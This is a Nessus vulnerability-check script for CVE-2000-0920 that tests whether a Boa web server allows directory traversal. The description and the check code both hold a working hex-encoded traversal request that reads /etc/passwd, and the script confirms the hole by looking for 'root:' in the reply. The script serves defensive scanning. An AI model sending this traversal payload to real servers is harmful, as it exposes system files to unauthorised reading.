#
# This script was written by Thomas Reinke <reinke@cvs.nessus.org>
#
# See the Nessus Scripts License for details
#

if(description)
{
 script_id(10527);
 script_bugtraq_id(1770);
 script_version ("$Revision: 1.10 $");
 script_cve_id("CVE-2000-0920");
 
 
 name["english"] = "Boa file retrieval";
 script_name(english:name["english"]);
 
 desc["english"] = "The remote Boa server
allows an attacker to read arbitrary files
on the remote web server,  prefixing the
pathname of the file with hex-encoded
../../..
Example:
    GET /%2e%2e/%2e%2e/%2e%2e/etc/passwd 

will return /etc/passwd.

Solution: upgrade to a later version of the
server found at http://www.boa.org

Risk factor : High";

 script_description(english:desc["english"]);
 
 summary["english"] = "Boa file retrieval";
 script_summary(english:summary["english"]);
 
 script_category(ACT_GATHER_INFO);
 
 
 script_copyright(english:"This script is Copyright (C) 2000 Thomas Reinke");
 family["english"] = "Remote file access";
 family["francais"] = "Accès aux fichiers distants";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("find_service.nes");
 script_require_ports("Services/www", 80);
 exit(0);
}

#
# The script code starts here
#
include("http_func.inc");

port = get_http_port(default:80);

if(get_port_state(port))
{
 soc = http_open_socket(port);
 if(soc)
 {
  buf = string("/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd");
  buf = http_get(item:buf, port:port);
  send(socket:soc, data:buf);
  rep = http_recv(socket:soc);
  if(("root:" >< rep) && ("Boa/" >< rep) )
  	security_hole(port);
  http_close_socket(soc);
 }
}
